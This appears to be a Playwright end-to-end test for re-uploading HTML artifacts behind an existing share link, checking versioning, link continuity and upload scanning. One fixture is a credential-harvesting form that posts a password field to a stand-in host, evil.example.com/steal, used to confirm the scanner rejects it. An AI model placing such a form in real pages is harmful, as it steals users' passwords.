import { test, expect, type Page } from "@playwright/test";

function uniqueEmail(): string {
  return `e2e_ver_${Math.random().toString(36).slice(2)}@example.com`;
}

async function signUp(page: Page) {
  await page.goto("/signup");
  await page.getByLabel("Full name").fill("E2E Version");
  await page.getByLabel("Email").fill(uniqueEmail());
  await page.getByLabel("Password", { exact: true }).fill("supersecret1");
  await page.getByLabel("Confirm password").fill("supersecret1");
  await page.getByRole("button", { name: /create account/i }).click();
  await expect(page).toHaveURL(/\/dashboard/);
}

const V1 = "<!doctype html><html><body><h1>version one</h1></body></html>";
const V2 = "<!doctype html><html><body><h1>version two replaced</h1></body></html>";
const MALICIOUS =
  '<!doctype html><html><body><form action="https://evil.example.com/steal" method="post"><input name="pw"/></form></body></html>';

test("re-upload replaces what an existing share link serves and keeps continuity", async ({
  page,
  context,
}) => {
  await signUp(page);
  const upload = await context.request.post("/api/creator/upload", {
    data: { title: "Versioned Deck", html: V1 },
  });
  const artifactId = (await upload.json()).id as string;
  const shareRes = await context.request.post("/api/creator/shares", {
    data: { artifactId, protection: "public", recipientLabel: "Dana @ Globex" },
  });
  const url = (await shareRes.json()).url as string;

  // The existing token serves v1 today.
  const before = await context.request.get(`${url}/raw`);
  expect(before.ok()).toBeTruthy();
  expect(await before.text()).toContain("version one");

  // Scan-reject path: a malicious replacement is refused (422) and nothing changes.
  const rejected = await context.request.post(
    `/api/creator/artifacts/${artifactId}/reupload`,
    { data: { html: MALICIOUS } },
  );
  expect(rejected.status()).toBe(422);

  // Replace in place with clean HTML.
  const reup = await context.request.post(
    `/api/creator/artifacts/${artifactId}/reupload`,
    { data: { html: V2 } },
  );
  expect(reup.ok()).toBeTruthy();
  expect((await reup.json()).version).toBe(2);

  // The SAME token now serves the new bytes (link unchanged).
  const after = await context.request.get(`${url}/raw`);
  expect(await after.text()).toContain("version two replaced");

  // Detail page reflects the new version and keeps the share (continuity).
  await page.goto(`/artifacts/${artifactId}`);
  await expect(page.getByText("v2").first()).toBeVisible();
  await expect(page.getByText("Dana @ Globex")).toBeVisible();
});
